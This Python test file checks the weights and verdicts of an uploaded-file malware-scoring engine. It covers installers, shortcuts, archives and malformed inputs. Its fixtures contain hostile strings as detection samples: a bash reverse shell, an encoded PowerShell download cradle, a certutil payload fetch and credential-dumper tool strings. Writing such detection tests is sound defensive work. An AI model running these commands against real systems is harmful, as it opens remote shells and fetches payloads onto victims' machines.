"""Pins app/services/file_rules.py:score(), the uploaded-file heuristic engine.

Pure function over an inspection record - no filesystem, no network, no sample
files. Every fixture is built inline from make_record(**overrides).

The case table is the source of truth for both band values; see the derivation in
the module docstring. The invariants at the bottom re-check that derivation
arithmetically, so changing a weight fails here rather than silently re-banding
every verdict the app renders.
"""
import base64
import os
import random
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from app.services.file_rules import (
    LNK_ROLLUPS,
    MALICIOUS_THRESHOLD,
    SIGNAL_LABELS,
    SUSPICIOUS_THRESHOLD,
    WEIGHTS,
    score,
)
from app.utils.lnk_parse import SIGNAL_LABELS as LNK_SIGNAL_LABELS

# A reputation block where sources actually answered and nobody has a bad record.
# `benign` is unreachable without one of these - see the module docstring.
CLEAN_REPUTATION = {
    'sources': {
        'virustotal': {'status': 'found',
                       'detection_stats': {'malicious': 0, 'suspicious': 0, 'total': 72}},
        'malwarebazaar': {'status': 'not_found'},
        'threatfox': {'status': 'not_found'},
    },
    'known_malware': False,
    'links': {},
}

# No API key for VirusTotal, and the keyless providers errored. Nobody answered.
SKIPPED_REPUTATION = {
    'sources': {
        'virustotal': None,
        'malwarebazaar': {'status': 'error', 'message': 'timeout'},
        'threatfox': {'status': 'error', 'message': 'timeout'},
    },
    'known_malware': False,
    'links': {},
}

MALWARE_REPUTATION = {
    'sources': {
        'virustotal': {'status': 'found',
                       'detection_stats': {'malicious': 58, 'suspicious': 3, 'total': 72}},
    },
    'known_malware': True,
    'links': {},
}

# A real DER certificate blob as it appears in a signed installer's strings: one
# long base64 run. It is here to prove `base64_blob` fires (ambient) and that
# `crypto_address` does *not* get carved out of it.
CERT_BLOB = (
    'MIIFaTCCBFGgAwIBAgIQBiVBcOdVFQ7dtn6RMFxRRTANBgkqhkiG9w0BAQsFADBPMQswCQYDVQQ'
    'GEwJVUzEVMBMGA1UEChMMRGlnaUNlcnQgSW5jMSkwJwYDVQQDEyBEaWdpQ2VydCBUaW1lc3Rhb'
    'XBpbmcgQ0EgLSBHNDAeFw0yNTAxMDEwMDAwMDBaFw0yNjAxMDEwMDAwMDBa'
)


def make_record(**overrides):
    """A benign baseline: an ordinary PDF that every reputation source answered on."""
    record = {
        'filename': 'quarterly-report.pdf',
        'size_bytes': 243_118,
        'digests': {'md5': 'a' * 32, 'sha1': 'b' * 40, 'sha256': 'c' * 64},
        'magic_type': 'PDF',
        'is_executable': False,
        'is_archive': False,
        'entropy': 6.91,
        'embedded_executables': [],
        'strings_sample': ['%PDF-1.7', '/Type /Catalog', 'Quarterly results summary',
                           'Microsoft Word for Microsoft 365'],
        'lnk': None,
        'iocs': [],
        'reputation': CLEAN_REPUTATION,
        'truncated': False,
        'error': None,
    }
    record.update(overrides)
    return record


def lnk(*keys):
    """A parsed-.lnk block carrying exactly these lnk_parse signal keys."""
    return {
        'parsed': {'parsed_ok': True},
        'signals': [{'key': key, 'label': LNK_SIGNAL_LABELS[key], 'detail': None}
                    for key in keys],
        'iocs': [],
    }


# (name, record, expected_level, must_contain_signals)
CASES = [
    ('clean PDF', make_record(), 'benign', []),
    (
        # THE false-positive anchor. A signed installer is an executable, is
        # compressed, fetches components over HTTP, and ships a certificate blob.
        # All four are ambient; together they are 0.20, below the 0.30 floor.
        'signed packed installer is not suspicious for being packed',
        make_record(
            filename='setup.exe', size_bytes=8_412_664, magic_type='PE',
            is_executable=True, entropy=7.93,
            strings_sample=['InnoSetupLdrWindow', 'URLDownloadToFileW',
                            'InternetOpenUrlA', CERT_BLOB,
                            'Setup was completed successfully.'],
        ),
        'benign',
        ['executable_file', 'high_entropy', 'download_staging', 'base64_blob'],
    ),
    (
        # Same installer, no reputation answer. It must degrade to unknown - never
        # to benign (absence is not clean) and never to suspicious (the bytes did
        # not change).
        'the same installer with no reputation answer is unknown, not benign',
        make_record(
            filename='setup.exe', size_bytes=8_412_664, magic_type='PE',
            is_executable=True, entropy=7.93,
            strings_sample=['InnoSetupLdrWindow', 'URLDownloadToFileW',
                            'InternetOpenUrlA', CERT_BLOB],
            reputation=SKIPPED_REPUTATION,
        ),
        'unknown',
        ['no_reputation_data'],
    ),
    (
        # Pins MALICIOUS_THRESHOLD <= 0.85: one reputation hit and nothing else.
        'a known-malware hash alone reaches malicious',
        make_record(reputation=MALWARE_REPUTATION),
        'malicious',
        ['known_malware_hash'],
    ),
    (
        # ...including for a document that earns no structural weight at all.
        'a known-malware document reaches malicious with no structural signal',
        make_record(filename='invoice.docx', magic_type='ZIP', is_archive=True,
                    entropy=7.1, reputation=MALWARE_REPUTATION),
        'malicious',
        ['known_malware_hash'],
    ),
    (
        'shortcut running an encoded PowerShell download cradle',
        make_record(
            filename='Invoice_2026.pdf.lnk', size_bytes=3_204, magic_type='LNK',
            is_executable=True, entropy=4.21,
            strings_sample=[
                'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe',
                '-nop -w hidden -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAT'
                'gBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAF'
                'MAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQA4AC4ANQAxAC4AMQAw'
                'ADAALgAxAC8AYQAuAHAAcwAxACcAKQA=',
            ],
            lnk=lnk('lolbas_target', 'encoded_powershell_command',
                    'base64_blob_in_arguments', 'download_cradle',
                    'hidden_window_argument', 'embedded_url',
                    'target_outside_program_locations'),
            reputation=SKIPPED_REPUTATION,
        ),
        'malicious',
        ['lnk_encoded_command', 'lnk_download_cradle', 'lnk_lolbas_target',
         'lnk_hidden_window', 'lnk_network_indicator',
         'lnk_encoded_command+lnk_download_cradle',
         'lnk_lolbas_target+lnk_hidden_window', 'filename_masquerade'],
    ),
    (
        # 0.45 + 0.05 + 0.05 = 0.55. Pins MALICIOUS_THRESHOLD above 0.55.
        'a PE named .pdf is suspicious, not malicious, on structure alone',
        make_record(
            filename='Invoice-4417.pdf', magic_type='PE', is_executable=True,
            size_bytes=612_352, entropy=7.61,
            strings_sample=['This program cannot be run in DOS mode',
                            'kernel32.dll', 'GetProcAddress'],
        ),
        'suspicious',
        ['executable_masquerading_as_document', 'executable_file', 'high_entropy'],
    ),
    (
        # 0.30 + 0.25 + 0.05 = 0.60, the highest "must stay suspicious" case, which
        # is what puts MALICIOUS_THRESHOLD above 0.60.
        'a PDF carrying an appended PE',
        make_record(
            filename='statement.pdf', magic_type='PDF', size_bytes=981_004,
            entropy=7.55,
            embedded_executables=[{'offset': 481_264, 'signature': 'PE'}],
            strings_sample=['%PDF-1.5', 'This program cannot be run in DOS mode'],
        ),
        'suspicious',
        ['embedded_executable_at_offset', 'embedded_executable_in_document'],
    ),
    (
        # 0.30 exactly, and nothing else. Pins SUSPICIOUS_THRESHOLD <= 0.30.
        'a lone embedded executable at a nonzero offset clears the floor',
        make_record(
            filename='payload.dat', magic_type=None, size_bytes=204_800,
            entropy=5.02, strings_sample=[],
            embedded_executables=[{'offset': 1024, 'signature': 'PE'}],
        ),
        'suspicious',
        ['embedded_executable_at_offset'],
    ),
    (
        'high entropy alone is not suspicious',
        make_record(filename='blob.dat', magic_type=None, size_bytes=5_242_880,
                    entropy=7.98, strings_sample=[]),
        'benign',
        ['high_entropy'],
    ),
    (
        # The second ambient profile: 0.25, the case that puts
        # SUSPICIOUS_THRESHOLD above 0.25. VS Code, Teams and Chrome all install
        # per-user, so "target outside Program Files" describes a normal desktop.
        'an ordinary per-user shortcut is benign',
        make_record(
            filename='Visual Studio Code.lnk', magic_type='LNK', is_executable=True,
            size_bytes=2_412, entropy=3.88,
            strings_sample=['C:\\Users\\analyst\\AppData\\Local\\Programs\\'
                            'Microsoft VS Code\\Code.exe', 'Visual Studio Code'],
            lnk=lnk('target_in_user_writable_path', 'target_outside_program_locations',
                    'embedded_url', 'oversized_lnk_file', 'run_as_user'),
        ),
        'benign',
        ['executable_file', 'lnk_suspicious_target_path', 'lnk_network_indicator',
         'lnk_structural_anomaly', 'lnk_elevation_request'],
    ),
    (
        # Every software release archive on earth contains an installer.
        'an archive containing an executable is not a verdict on its own',
        make_record(
            filename='release-v2.1.zip', magic_type='ZIP', is_archive=True,
            size_bytes=9_114_882, entropy=7.99,
            strings_sample=['setup.exe', 'README.txt', 'lib/core.dll',
                            'docs/manual.pdf'],
        ),
        'benign',
        ['archive_containing_executable', 'high_entropy'],
    ),
    (
        # 0.25 + 0.25 + 0.30 + 0.05 + 0.05 = 0.90, the case that puts
        # MALICIOUS_THRESHOLD at or below 0.90.
        'a packed implant with C2, evasion, and credential-dumper strings',
        make_record(
            filename='update.exe', magic_type='PE', is_executable=True,
            size_bytes=402_944, entropy=7.71,
            strings_sample=['meterpreter', 'CheckRemoteDebuggerPresent',
                            'sekurlsa::logonpasswords', 'VBoxService'],
            reputation=SKIPPED_REPUTATION,
        ),
        'malicious',
        ['c2_artifact', 'anti_analysis', 'credential_theft'],
    ),
    (
        'a shell script with a reverse-shell one-liner',
        make_record(
            filename='update.sh', magic_type='SCRIPT', size_bytes=512, entropy=4.63,
            strings_sample=['#!/bin/bash',
                            'bash -i >& /dev/tcp/203.0.113.9/4444 0>&1'],
        ),
        'suspicious',
        ['reverse_shell'],
    ),
    (
        # 0.10 + 0.05 + 0.15 combo + 0.05 = 0.35. Neither half is a verdict; the
        # pair is the dropper shape.
        'a script that writes autostart and fetches from the network',
        make_record(
            filename='task.vbs', magic_type=None, is_executable=True,
            size_bytes=2_048, entropy=4.9,
            strings_sample=['Software\\Microsoft\\Windows\\CurrentVersion\\Run',
                            'URLDownloadToFileA'],
        ),
        'suspicious',
        ['persistence', 'download_staging', 'persistence+download_staging'],
    ),
    (
        # 0.25 + 0.25 + 0.20 combo + 0.05 = 0.75. Suspicious, not malicious: no
        # source confirmed anything, and an obfuscated fetch is a stager shape,
        # not proof of one.
        'an obfuscated download cradle',
        make_record(
            filename='invoice.hta', magic_type=None, is_executable=True,
            size_bytes=6_144, entropy=5.4,
            strings_sample=[
                'certutil.exe -urlcache -split -f http://198.51.100.7/a.exe',
                'eval(new ActiveXObject("WScript.Shell"))',
                'powershell -w hidden -EncodedCommand',
            ],
        ),
        'suspicious',
        ['download_cradle', 'encoded_command', 'encoded_command+download_cradle'],
    ),
    (
        # A wallet address is a weak signal on purpose: whitepapers, wallet
        # backups and donation footers all carry one.
        'a cryptocurrency address alone is not a verdict',
        make_record(
            filename='READ_ME.txt', magic_type=None, size_bytes=1_204, entropy=4.82,
            strings_sample=['Your files have been encrypted.',
                            'Send 0.5 BTC to bc1qar0srrr7xfkvy5l643lydnw9re59gtzzwf5mdq'],
        ),
        'benign',
        ['crypto_address'],
    ),
    (
        # truncated + error contribute 0.0 and cannot make a record read clean.
        'a truncated, errored inspection with no reputation is unknown',
        make_record(
            filename='huge.bin', magic_type=None, size_bytes=104_857_600,
            entropy=0.0, strings_sample=[], truncated=True,
            error='inspection window exceeded', reputation=SKIPPED_REPUTATION,
        ),
        'unknown',
        ['analysis_truncated', 'analysis_error', 'no_reputation_data'],
    ),
    (
        'right-to-left override in the filename',
        make_record(
            filename='invoice\u202egpj.exe', magic_type='PE', is_executable=True,
            size_bytes=88_064, entropy=6.2,
            strings_sample=['This program cannot be run in DOS mode'],
        ),
        'suspicious',
        ['filename_masquerade', 'executable_file'],
    ),
]

# case name -> signals that must NOT appear. CASES only asserts presence, so it
# cannot express "this must not read as an implant".
MUST_NOT_CONTAIN = {
    'clean PDF': [
        'known_malware_hash', 'executable_file', 'high_entropy', 'base64_blob',
        'crypto_address', 'download_staging', 'no_reputation_data',
        'analysis_truncated', 'analysis_error', 'embedded_executable_at_offset',
        'executable_masquerading_as_document', 'filename_masquerade',
    ],
    'signed packed installer is not suspicious for being packed': [
        'reverse_shell', 'c2_artifact', 'anti_analysis', 'credential_theft',
        'crypto_address', 'encoded_command', 'download_cradle', 'persistence',
        'privilege_escalation', 'executable_masquerading_as_document',
        'filename_masquerade', 'embedded_executable_at_offset',
        'archive_containing_executable', 'no_reputation_data',
    ],
    'an ordinary per-user shortcut is benign': [
        'lnk_encoded_command', 'lnk_download_cradle', 'lnk_masquerade',
        'lnk_hidden_window', 'lnk_lolbas_target', 'lnk_defense_evasion',
        'lnk_persistence', 'lnk_appended_data', 'filename_masquerade',
    ],
    'an archive containing an executable is not a verdict on its own': [
        'executable_file', 'embedded_executable_at_offset',
        'embedded_executable_in_document',
    ],
    'high entropy alone is not suspicious': [
        'executable_file', 'archive_containing_executable', 'base64_blob',
    ],
    'a cryptocurrency address alone is not a verdict': [
        'executable_file', 'base64_blob', 'high_entropy', 'c2_artifact',
    ],
}

# Inputs that are not records at all. score() is fed a dict assembled from
# attacker-controlled bytes by helpers documented to degrade rather than raise;
# it must never be the thing that 500s an upload route.
GARBAGE_INPUTS = [
    None,
    {},
    [],
    '',
    'a string',
    42,
    0.0,
    True,
    (),
    {'filename': None, 'reputation': None, 'lnk': None},
    {'filename': 12345, 'size_bytes': 'big', 'entropy': 'high',
     'magic_type': 17, 'strings_sample': 'not a list', 'lnk': 'not a dict',
     'iocs': None, 'digests': None, 'embedded_executables': 'nope',
     'reputation': [], 'truncated': 'yes', 'error': 0},
    {'strings_sample': [None, 42, b'bytes', {'k': 'v'}],
     'embedded_executables': [None, 'x', {'offset': 'nan'}, {'offset': -5}, {}],
     'lnk': {'signals': [None, 'lolbas_target', {'key': 99}, {'nokey': 1}, 7]},
     'reputation': {'sources': {'vt': 'not a dict', 'mb': None, 'tf': 12}}},
    {'entropy': float('nan'), 'size_bytes': -1, 'filename': '.' * 50},
    {'filename': '\u202e' * 10, 'reputation': {'answered': 'yes'}},
    {'reputation': {'answered': False, 'known_malware': True}},
]

# The two named ambient profiles from the module docstring. Each is the complete
# signal set of a file nobody should be paged about, and each must sit below the
# suspicious floor.
AMBIENT_PROFILES = {
    'packed installer': (
        'executable_file', 'high_entropy', 'download_staging', 'base64_blob',
    ),
    'per-user shortcut': (
        'executable_file', 'lnk_suspicious_target_path', 'lnk_network_indicator',
        'lnk_structural_anomaly', 'lnk_elevation_request',
    ),
}

# Weighted at exactly 0.0: reported so the analyst sees why a verdict is thin,
# never able to move the total.
ZERO_WEIGHT_SIGNALS = ('no_reputation_data', 'analysis_truncated', 'analysis_error')


def check_cases(failures):
    for name, record, expected_level, must_contain in CASES:
        result = score(record)
        if result['level'] != expected_level:
            failures.append(
                f'{name}: level -> {result["level"]!r} (score {result["score"]}), '
                f'expected {expected_level!r}; signals={result["signals"]}'
            )
        for signal in must_contain:
            if signal not in result['signals']:
                failures.append(f'{name}: expected signal {signal!r} in {result["signals"]}')
        for signal in MUST_NOT_CONTAIN.get(name, []):
            if signal in result['signals']:
                failures.append(f'{name}: unexpected signal {signal!r} in {result["signals"]}')
        if not 0.0 <= result['score'] <= 1.0:
            failures.append(f'{name}: score {result["score"]} out of range')
        if set(result['signals']) - set(WEIGHTS):
            failures.append(f'{name}: reported signals outside WEIGHTS: {result["signals"]}')


def check_garbage(failures):
    for item in GARBAGE_INPUTS:
        try:
            result = score(item)
        except Exception as exc:  # noqa: BLE001 - the whole point is "never raises"
            failures.append(f'score({item!r}) raised {type(exc).__name__}: {exc}')
            continue
        if set(result) != {'level', 'score', 'signals'}:
            failures.append(f'score({item!r}) -> unexpected keys {sorted(result)}')
        if result['level'] not in ('benign', 'suspicious', 'malicious', 'unknown'):
            failures.append(f'score({item!r}) -> bad level {result["level"]!r}')
        if not 0.0 <= result['score'] <= 1.0:
            failures.append(f'score({item!r}) -> score {result["score"]} out of range')


def check_skipped_reputation(failures):
    """The IP-report lesson: a record nothing could be learned from must not
    claim CLEAN. An inert file whose every lookup was skipped scores exactly 0.0
    and reports unknown."""
    result = score(make_record(reputation=SKIPPED_REPUTATION))
    if result['level'] != 'unknown':
        failures.append(f'all-skipped reputation -> {result["level"]!r}, must be unknown')
    if result['score'] != 0.0:
        failures.append(f'all-skipped reputation -> score {result["score"]}, must be exactly 0.0')
    if result['signals'] != ['no_reputation_data']:
        failures.append(f'all-skipped reputation -> signals {result["signals"]}, '
                        f"must be ['no_reputation_data']")

    for missing in (None, {}, {'sources': {}}, {'sources': None},
                    {'known_malware': False, 'sources': {'vt': {'status': 'skipped'}}},
                    {'sources': {'vt': {'state': 'unavailable'}}}):
        result = score(make_record(reputation=missing))
        if result['level'] != 'unknown':
            failures.append(f'reputation={missing!r} -> {result["level"]!r}, must be unknown')


def check_zero_weight_signals(failures):
    for signal in ZERO_WEIGHT_SIGNALS:
        if WEIGHTS[signal] != 0.0:
            failures.append(f'{signal} must be weighted 0.0, is {WEIGHTS[signal]}')
    # Present them all at once on an otherwise inert record: still 0.0.
    result = score(make_record(truncated=True, error='boom',
                               reputation=SKIPPED_REPUTATION))
    if result['score'] != 0.0:
        failures.append(f'absence signals contributed {result["score"]}, must contribute 0.0')


def check_ambient_floor(failures):
    for name, profile in AMBIENT_PROFILES.items():
        total = sum(WEIGHTS[signal] for signal in profile)
        if total >= SUSPICIOUS_THRESHOLD:
            failures.append(
                f'ambient profile {name!r} sums to {total:.2f}, which is not below '
                f'SUSPICIOUS_THRESHOLD {SUSPICIOUS_THRESHOLD}'
            )


def check_band_derivation(failures):
    """Re-derives both bands from the weights, so a weight edit fails here."""
    shortcut = sum(WEIGHTS[s] for s in AMBIENT_PROFILES['per-user shortcut'])
    if not shortcut < SUSPICIOUS_THRESHOLD <= WEIGHTS['embedded_executable_at_offset']:
        failures.append(
            f'SUSPICIOUS_THRESHOLD {SUSPICIOUS_THRESHOLD} must lie in '
            f'({shortcut:.2f}, {WEIGHTS["embedded_executable_at_offset"]:.2f}]'
        )

    appended_pe = (WEIGHTS['embedded_executable_at_offset']
                   + WEIGHTS['embedded_executable_in_document']
                   + WEIGHTS['high_entropy'])
    implant = (WEIGHTS['c2_artifact'] + WEIGHTS['anti_analysis']
               + WEIGHTS['credential_theft'] + WEIGHTS['executable_file']
               + WEIGHTS['high_entropy'])
    if not appended_pe < MALICIOUS_THRESHOLD <= implant:
        failures.append(
            f'MALICIOUS_THRESHOLD {MALICIOUS_THRESHOLD} must lie in '
            f'({appended_pe:.2f}, {implant:.2f}]'
        )

    if WEIGHTS['known_malware_hash'] != MALICIOUS_THRESHOLD:
        failures.append('known_malware_hash must be weighted at exactly '
                        f'MALICIOUS_THRESHOLD, is {WEIGHTS["known_malware_hash"]}')


def check_table_invariants(failures):
    if set(WEIGHTS) != set(SIGNAL_LABELS):
        failures.append(
            f'WEIGHTS and SIGNAL_LABELS disagree: '
            f'{sorted(set(WEIGHTS) ^ set(SIGNAL_LABELS))}'
        )
    for name in WEIGHTS:
        if '+' not in name:
            continue
        for half in name.split('+'):
            if half not in WEIGHTS:
                failures.append(f'combo {name!r} names a non-signal constituent {half!r}')
    if any(weight < 0 for weight in WEIGHTS.values()):
        failures.append('no weight may be negative - subtracting is not "additive"')


def check_lnk_partition(failures):
    """Every lnk_parse signal key is weighted by exactly one rollup. A new key in
    lnk_parse fails here rather than being silently dropped on the floor."""
    assigned = {}
    for rollup, keys in LNK_ROLLUPS.items():
        if rollup not in WEIGHTS:
            failures.append(f'lnk rollup {rollup!r} has no weight')
        for key in keys:
            if key in assigned:
                failures.append(f'lnk key {key!r} is in both {assigned[key]!r} and {rollup!r}')
            assigned[key] = rollup
    missing = set(LNK_SIGNAL_LABELS) - set(assigned)
    extra = set(assigned) - set(LNK_SIGNAL_LABELS)
    if missing:
        failures.append(f'lnk_parse signal keys with no rollup: {sorted(missing)}')
    if extra:
        failures.append(f'rollups reference unknown lnk_parse keys: {sorted(extra)}')


BASE64_FUZZ_ROUNDS = 300


def check_base64_is_not_a_wallet(failures):
    """A Base58 alternation carves "wallet addresses" out of arbitrary base64 at a
    steady rate unless `+`, `/`, and `=` are in the boundary class - and the
    population it does that to is packed binaries, the exact files already
    carrying the two entropy/executable ambient signals. Seeded, so this is a
    fixed 300-case table rather than a flaky one."""
    rng = random.Random(7)
    positives = 0
    for _ in range(BASE64_FUZZ_ROUNDS):
        blob = base64.b64encode(
            bytes(rng.randrange(256) for _ in range(rng.randrange(200, 4000)))
        ).decode('ascii')
        result = score(make_record(
            filename='setup.exe', magic_type='PE', is_executable=True,
            size_bytes=921_600, entropy=7.9, strings_sample=[blob],
        ))
        if 'crypto_address' in result['signals']:
            positives += 1
        if result['level'] != 'benign':
            failures.append(f'a packed binary holding one base64 blob -> {result!r}')
            break
    if positives:
        failures.append(
            f'crypto_address fired on {positives}/{BASE64_FUZZ_ROUNDS} random base64 '
            f'blobs; the address boundary class must exclude +, / and ='
        )


def check_determinism(failures):
    """Same record in, same verdict out - no clock, no environment, no ordering."""
    for name, record, _level, _must in CASES:
        first, second = score(record), score(record)
        if first != second:
            failures.append(f'{name}: score() is not deterministic: {first} vs {second}')


def main():
    failures = []
    check_cases(failures)
    check_garbage(failures)
    check_skipped_reputation(failures)
    check_zero_weight_signals(failures)
    check_ambient_floor(failures)
    check_band_derivation(failures)
    check_table_invariants(failures)
    check_lnk_partition(failures)
    check_base64_is_not_a_wallet(failures)
    check_determinism(failures)

    if failures:
        print('FAIL:')
        for line in failures:
            print('  ' + line)
        sys.exit(1)
    print(f'PASS: {len(CASES)} scoring + {len(GARBAGE_INPUTS)} malformed-input + '
          f'{len(AMBIENT_PROFILES)} ambient-profile + {len(ZERO_WEIGHT_SIGNALS)} '
          f'absence + {len(LNK_SIGNAL_LABELS)} lnk-partition + '
          f'{BASE64_FUZZ_ROUNDS} base64-fuzz cases, plus band-derivation, '
          f'table-invariant, and determinism checks')


if __name__ == '__main__':
    main()
